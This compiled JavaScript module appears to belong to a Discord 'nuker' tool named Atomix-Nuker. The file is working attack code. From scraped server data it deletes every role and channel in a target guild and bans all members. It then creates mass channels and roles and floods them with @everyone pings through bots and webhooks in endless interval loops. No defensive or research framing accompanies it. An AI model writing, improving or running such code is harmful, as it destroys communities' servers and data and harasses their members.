"use strict";
var __awaiter = (this && this.__awaiter) || function (thisArg, _arguments, P, generator) {
    function adopt(value) { return value instanceof P ? value : new P(function (resolve) { resolve(value); }); }
    return new (P || (P = Promise))(function (resolve, reject) {
        function fulfilled(value) { try { step(generator.next(value)); } catch (e) { reject(e); } }
        function rejected(value) { try { step(generator["throw"](value)); } catch (e) { reject(e); } }
        function step(result) { result.done ? resolve(result.value) : adopt(result.value).then(fulfilled, rejected); }
        step((generator = generator.apply(thisArg, _arguments || [])).next());
    });
};
Object.defineProperty(exports, "__esModule", { value: true });
exports.wizz = void 0;
const chalk_1 = require("chalk");
const createString_1 = require("../utils/createString");
const getTheme_1 = require("../utils/getTheme");
const logo_1 = require("../utils/logo");
const logoOptions_1 = require("../utils/logoOptions");
const main_1 = require("./main");
const scrape_1 = require("./scrape");
function mainWizz(client, db, rl, guildID, channelName, channelAmount, roleName, roleAmount, webhookName) {
    function nukeStr(str, type) {
        let r = `${mainColor("[")}${chalk_1.white(type === "rateLimit"
            ? "!"
            : type === "success"
                ? "+"
                : type === "fail"
                    ? "-"
                    : "")}${mainColor("]")} ${chalk_1.white(str)}`;
        return r;
    }
    let mainColor = getTheme_1.getTheme(db);
    if (!client.guilds.cache.has(guildID)) {
        console.log(createString_1.createString("Unknown server", db, "semi"));
        setTimeout(() => {
            main_1.main(db, rl, client);
        }, 2000);
        return;
    }
    let data = db.get(`scrape_${guildID}`);
    let server = client.guilds.cache.get(guildID);
    // console.log(server)
    // if (
    //   !server.me.hasPermissions([
    //     "BAN_MEMBERS",
    //     "MANAGE_CHANNELS",
    //     "MANAGE_ROLES",
    //   ])
    // ) {
    //   process.title = "[Atomix-Nuker] - Missing permissions";
    //   console.log(createString("Failed to find required permissions", db));
    //   console.log(" ");
    //   rl.question(createString("Type anything to continue", db), () => {
    //     main(db, rl, client);
    //   });
    //   return;
    // }
    process.title = `[Atomix-Nuker] - Nuking ${server.name}`;
    let rolesArr = data.roles;
    rolesArr.map((roleID) => __awaiter(this, void 0, void 0, function* () {
        let role = server.roles.cache.get(roleID);
        role
            .delete()
            .then((r) => {
            console.log(nukeStr(`Deleted role ${r.id}`, "success"));
        })
            .catch(() => {
            console.log(nukeStr(`Failed to delete role ${roleID}`, "fail"));
        });
    }));
    let channelArr = data.channels;
    channelArr.map((channelID) => __awaiter(this, void 0, void 0, function* () {
        let channel = server.channels.cache.get(channelID);
        (yield channel.fetch())
            .delete()
            .then((r) => {
            console.log(nukeStr(`Deleted channel ${r.id}`, "success"));
        })
            .catch(() => {
            console.log(nukeStr(`Failed to delete channel ${channelID}`, "fail"));
        });
    }));
    let membersArr = data.members;
    if (db.has(`settings.scrape.delnuke`)) {
        if (db.get(`settings.scrape.delnuke`) === true) {
            db.delete(`scrape_${guildID}`);
            db.save();
        }
    }
    membersArr.map((memID) => __awaiter(this, void 0, void 0, function* () {
        let member = server.members.cache.get(memID);
        member
            .ban()
            .then(() => {
            console.log(nukeStr(`Banned member ${memID}`, "success"));
        })
            .catch(() => {
            console.log(nukeStr(`Failed to ban member ${memID}`, "fail"));
        });
    }));
    // server.channels.cache.map((ch) => {
    //   ch.delete()
    //     .then((c) => {
    //       console.log(nukeStr(`Deleted channel ${c.id}`, "success"));
    //     })
    //     .catch(() => {
    //       console.log(
    //         nukeStr(`Failed to delete channel ${ch.id}`, "fail")
    //       );
    //     });
    // });
    for (let i = 0; i < Number(channelAmount); i++) {
        server.channels
            .create(channelName)
            .then((x) => {
            console.log(nukeStr(`Created channel ${x.id}`, "success"));
            x.createWebhook(webhookName)
                .then((hook) => {
                console.log(nukeStr(`Created webhook ${webhookName}`, "success"));
                setInterval(() => {
                    hook
                        .send(`@everyone`)
                        .then((mm) => {
                        console.log(nukeStr(`Sent webhook webhook message ${mm.id}`, "success"));
                    })
                        .catch(() => {
                        console.log(nukeStr(`Failed to send webhook message`, "fail"));
                    });
                });
            })
                .catch(() => {
                console.log(nukeStr("Failed to create webhook", "fail"));
            });
            setInterval(() => {
                x.send(`@everyone`)
                    .then((m) => {
                    console.log(nukeStr(`Sent channel message ${m.id}`, "success"));
                })
                    .catch(() => {
                    console.log(nukeStr("Failed to send channel message", "fail"));
                });
            });
        })
            .catch(() => {
            console.log(nukeStr(`Failed to create channel`, "fail"));
        });
    }
    for (let i = 0; i < Number(roleAmount); i++) {
        server.roles
            .create({ data: { name: roleName, color: "RANDOM" } })
            .then((x) => {
            console.log(nukeStr(`Created role ${x.id}`, "success"));
        })
            .catch(() => {
            console.log(nukeStr(`Failed to create role`, "fail"));
        });
    }
}
function checkConfigBefore(db, guildID) {
    let c = null;
    if (db.has(`settings.scrape.checknuke`)) {
        if (db.get(`settings.scrape.checknuke`) === true) {
            if (!db.has(`scrape_${guildID}`))
                c = "NONE";
        }
    }
    return c;
}
function wizz(client, db, rl) {
    logo_1.logo(db);
    function askQuestions() {
        rl.question(createString_1.createString("Enter channel names", db), (channelName) => {
            if (channelName === "exit" || channelName === "menu") {
                main_1.main(db, rl, client);
                return;
            }
            rl.question(createString_1.createString("Enter channel amount", db), (channelAmount) => {
                if (channelAmount === "exit" || channelAmount === "menu") {
                    main_1.main(db, rl, client);
                    return;
                }
                rl.question(createString_1.createString("Enter role names", db), (roleName) => {
                    if (roleName === "exit" || roleName === "menu") {
                        main_1.main(db, rl, client);
                        return;
                    }
                    rl.question(createString_1.createString("Enter role amount", db), (roleAmount) => {
                        if (roleAmount === "exit" || roleAmount === "menu") {
                            main_1.main(db, rl, client);
                            return;
                        }
                        rl.question(createString_1.createString("Enter webhook name", db), (webhookName) => {
                            if (webhookName === "exit" || webhookName === "menu") {
                                main_1.main(db, rl, client);
                                return;
                            }
                            rl.question(createString_1.createString("Enter guild ID", db), (guildID) => {
                                if (guildID === "exit" || guildID === "menu") {
                                    main_1.main(db, rl, client);
                                    return;
                                }
                                if (checkConfigBefore(db, guildID) === "NONE") {
                                    console.log(createString_1.createString("There is no scrape data for the server", db));
                                    console.log(" ");
                                    rl.question(createString_1.createString("Would you like to continue to *scraper* or *menu*", db), (ox) => {
                                        if (ox === "scraper") {
                                            scrape_1.scrape(rl, db, client);
                                            return;
                                        }
                                        else if (ox === "menu") {
                                            main_1.main(db, rl, client);
                                            return;
                                        }
                                        else {
                                            main_1.main(db, rl, client);
                                            return;
                                        }
                                    });
                                    return;
                                }
                                db.set(`nuke_settings`, {
                                    channelName,
                                    channelAmount,
                                    roleName,
                                    roleAmount,
                                    webhookName,
                                });
                                db.save();
                                mainWizz(client, db, rl, guildID, channelName, channelAmount, roleName, roleAmount, webhookName);
                            });
                        });
                    });
                });
            });
        });
    }
    if (db.has(`nuke_settings`)) {
        if (db.has(`settings.nuke.useold`)) {
            if (db.get(`settings.nuke.useold`) === true) {
                console.clear();
                logo_1.logo(db);
                let data = db.get(`nuke_settings`);
                rl.question(createString_1.createString("Enter guild ID", db), (guildID) => {
                    if (checkConfigBefore(db, guildID) === "NONE") {
                        console.log(createString_1.createString("There is no scrape data for the server", db));
                        console.log(" ");
                        rl.question(createString_1.createString("Would you like to continue to *scraper* or *menu*", db), (ox) => {
                            if (ox === "scraper") {
                                scrape_1.scrape(rl, db, client);
                                return;
                            }
                            else if (ox === "menu") {
                                main_1.main(db, rl, client);
                                return;
                            }
                            else {
                                main_1.main(db, rl, client);
                                return;
                            }
                        });
                        return;
                    }
                    mainWizz(client, db, rl, guildID, data.channelName, data.channelAmount, data.roleName, data.roleAmount, data.webhookName);
                });
                return;
            }
        }
        else if (db.has(`settings.nuke.setnew`)) {
            if (db.get("settings.nuke.setnew") === true) {
                console.clear();
                askQuestions();
                return;
            }
        }
        console.clear();
        logoOptions_1.logoOptions(db);
        console.log(createString_1.createString("There are already saved nuked settings", db));
        rl.question(createString_1.createString("Would you like to set *new* or use *old*", db), (option) => {
            if (option === "new") {
                askQuestions();
            }
            else if (option === "old") {
                let data = db.get(`nuke_settings`);
                rl.question(createString_1.createString("Enter guild ID", db), (guildID) => {
                    if (checkConfigBefore(db, guildID) === "NONE") {
                        console.log(createString_1.createString("There is no scrape data for the server", db));
                        console.log(" ");
                        rl.question(createString_1.createString("Would you like to continue to *scraper* or *menu*", db), (ox) => {
                            if (ox === "scraper") {
                                scrape_1.scrape(rl, db, client);
                                return;
                            }
                            else if (ox === "menu") {
                                main_1.main(db, rl, client);
                                return;
                            }
                            else {
                                main_1.main(db, rl, client);
                                return;
                            }
                        });
                        return;
                    }
                    mainWizz(client, db, rl, guildID, data.channelName, data.channelAmount, data.roleName, data.roleAmount, data.webhookName);
                });
            }
            else if (option === "menu" || option === "exit") {
                main_1.main(db, rl, client);
                return;
            }
        });
    }
    else {
        console.clear();
        askQuestions();
    }
}
exports.wizz = wizz;
